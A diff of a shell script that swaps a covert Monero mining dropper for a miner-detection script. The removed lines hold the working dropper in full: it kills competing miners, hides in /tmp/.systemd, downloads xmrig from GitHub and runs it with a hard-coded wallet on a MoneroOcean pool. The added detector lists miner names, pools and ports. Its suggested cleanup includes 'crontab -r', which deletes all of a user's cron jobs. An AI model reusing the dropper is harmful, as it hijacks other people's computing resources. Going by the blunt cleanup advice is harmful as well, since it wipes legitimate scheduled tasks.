@@ -1,105 +1,73 @@
 #!/bin/sh
-# Универсальный скрипт для всех систем (даже без bash/wget)
+# Быстрая проверка майнера
 
-# Проверка на уже запущенный процесс с этим кошельком
-WALLET_ID="49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE"
+echo "=== Quick Miner Check ==="
+echo "Time: $(date)"
 
-# Проверяем процессы (универсальный метод)
-if ps aux 2>/dev/null | grep -v grep | grep "$WALLET_ID" >/dev/null; then
-    echo "[*] Miner with this wallet ID is already running. Exiting."
-    exit 0
+# Ключевые индикаторы
+FOUND=0
+
+# 1. Проверка процессов майнеров
+echo ""
+echo "1. Checking miner processes..."
+if ps aux 2>/dev/null | grep -v grep | grep -E 'xmrig|miner|cpuminer|xmr-stak|ccminer|49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE' >/dev/null; then
+    echo "❌ FOUND: Miner processes detected!"
+    ps aux 2>/dev/null | grep -v grep | grep -E 'xmrig|miner|cpuminer|xmr-stak|ccminer' | head -5
+    FOUND=1
+else
+    echo "✅ No miner processes"
 fi
 
-# Альтернативная проверка для систем где ps aux не работает
-if ! ps aux 2>/dev/null && ps -ef 2>/dev/null | grep -v grep | grep "$WALLET_ID" >/dev/null; then
-    echo "[*] Miner with this wallet ID is already running. Exiting."
-    exit 0
+# 2. Проверка популярных пулов
+echo ""
+echo "2. Checking mining pools..."
+POOLS="moneroocean.stream minexmr.com supportxmr.com nanopool.org pool.hashvault.pro"
+for pool in $POOLS; do
+    if ps aux 2>/dev/null | grep -v grep | grep -i "$pool" >/dev/null; then
+        echo "❌ FOUND: Process using pool: $pool"
+        ps aux 2>/dev/null | grep -v grep | grep -i "$pool" | head -3
+        FOUND=1
+    fi
+done
+
+# 3. Проверка сетевых соединений
+echo ""
+echo "3. Checking network connections..."
+if command -v ss >/dev/null 2>&1; then
+    if ss -tnp 2>/dev/null | grep -E '10128|4444|7777|9999|14444' | grep -i 'moneroocean\|minexmr\|supportxmr' >/dev/null; then
+        echo "❌ FOUND: Mining connections detected!"
+        ss -tnp 2>/dev/null | grep -E '10128|4444|7777|9999|14444' | grep -i 'moneroocean\|minexmr\|supportxmr' | head -5
+        FOUND=1
+    fi
+elif command -v netstat >/dev/null 2>&1; then
+    if netstat -tnp 2>/dev/null | grep -E '10128|4444|7777|9999|14444' | grep -i 'moneroocean\|minexmr\|supportxmr' >/dev/null; then
+        echo "❌ FOUND: Mining connections detected!"
+        netstat -tnp 2>/dev/null | grep -E '10128|4444|7777|9999|14444' | grep -i 'moneroocean\|minexmr\|supportxmr' | head -5
+        FOUND=1
+    fi
 fi
 
-# Функция для определения доступного загрузчика
-get_downloader() {
-    if command -v wget >/dev/null 2>&1; then
-        echo "wget -qO-"
-    elif command -v curl >/dev/null 2>&1; then
-        echo "curl -s"
-    else
-        echo "Error: Neither wget nor curl is installed" >&2
-        exit 1
-    fi
-}
+# 4. Проверка высокого использования CPU
+echo ""
+echo "4. Checking CPU usage..."
+if ps aux 2>/dev/null | awk '$3 > 50.0 && !/grep/ {print $1":"$2":"$3":"$11}' | grep -v 'systemd\|kworker' | head -3; then
+    echo "⚠️  High CPU usage detected (check if legitimate)"
+else
+    echo "✅ CPU usage normal"
+fi
 
-DOWNLOADER=$(get_downloader)
-
-# Принудительное завершение процессов (работает без bash)
-killall_processes() {
-    for proc in nohup xmrig miner cpuminer xmr-stak systemd-service systemf monero; do
-        pkill -9 -f "$proc" 2>/dev/null || killall -9 "$proc" 2>/dev/null || true
-    done
-    
-    # Популярные пулы
-    for pool in pool.hashvault.pro moneroocean.stream gulf.moneroocean.stream supportxmr.com nanopool.org minexmr.com xmrig.com xmrig.cc pool.minexmr.com xmrpool.eu moneropool.com pool.4i77.com pool.usxmrpool.com xmrpool.net fairhash.org monero.crypto-pool.fr sumominer.com monero.hashvault.pro backup-pool.com moriaxmr.com bohemianpool.com mine.xmrpool.net pool.xmr.pt; do
-        pkill -9 -f "$pool" 2>/dev/null || true
-    done
-}
-
-# Генерация случайного имени (работает без /dev/urandom)
-generate_worker_name() {
-    if [ -f /dev/urandom ]; then
-        WORKER_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
-    else
-        WORKER_NAME=$(date +%s | sha256sum | base64 | head -c 8 2>/dev/null || echo "worker$(date +%s | cut -c9-12)")
-    fi
-    echo "$WORKER_NAME"
-}
-
-# Основная логика
-killall_processes
-
-# Чистка скрытых мест
-for path in /tmp/.systemd /tmp/.systemd/m /dev/shm/.systemd /dev/shm/.systemd/m ./.cache hwloc-without-main main.zip; do
-    rm -rf "$path" 2>/dev/null || true
-done
-
-# Поиск подозрительных файлов
-for loc in /tmp /dev/shm; do
-    find "$loc" -name '.systemd' -type d -exec rm -rf {} \; 2>/dev/null || true
-    find "$loc" -name '.X*' -type d -exec rm -rf {} \; 2>/dev/null || true
-    find "$loc" -name '.cache' -type d -exec rm -rf {} \; 2>/dev/null || true
-done
-
-# Генерация имени воркера
-WORKER_NAME=$(generate_worker_name)
-
-# Создаем скрытую папку в /tmp
-HIDDEN_DIR="/tmp/.systemd"
-mkdir -p "$HIDDEN_DIR" 2>/dev/null || {
-    # Если не удалось создать в /tmp, пробуем альтернативные места
-    HIDDEN_DIR="$(mktemp -d 2>/dev/null || mktemp -d -t '.systemd' 2>/dev/null || echo '/tmp/.systemd')"
-    mkdir -p "$HIDDEN_DIR" 2>/dev/null || exit 1
-}
-
-# Скачивание и запуск в скрытой папке
-cd "$HIDDEN_DIR" || exit 1
-
-$DOWNLOADER https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip > main.zip
-if [ $? -ne 0 ]; then
-    echo "[-] ERROR: Failed to download miner archive"
+# Итог
+echo ""
+echo "=== RESULT ==="
+if [ "$FOUND" -eq 1 ]; then
+    echo "❌ MINING ACTIVITY DETECTED!"
+    echo ""
+    echo "Quick cleanup commands:"
+    echo "  pkill -9 xmrig miner cpuminer xmr-stak"
+    echo "  crontab -r"
+    echo "  rm -rf /tmp/.systemd /dev/shm/.systemd"
     exit 1
+else
+    echo "✅ No mining activity detected"
+    exit 0
 fi
-
-unzip -o main.zip >/dev/null 2>&1 || {
-    echo "[-] WARNING: unzip failed, trying with busybox"
-    busybox unzip -o main.zip 2>/dev/null || exit 1
-}
-
-cd hwloc-without-main || exit 1
-
-chmod +x xmrig 2>/dev/null || true
-mv xmrig m
-
-nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
-PID=$!
-
-echo "[*] Miner started with worker name: $WORKER_NAME"
-echo "[*] Process ID: $PID"
-echo "[*] To stop the miner, run: kill $PID"
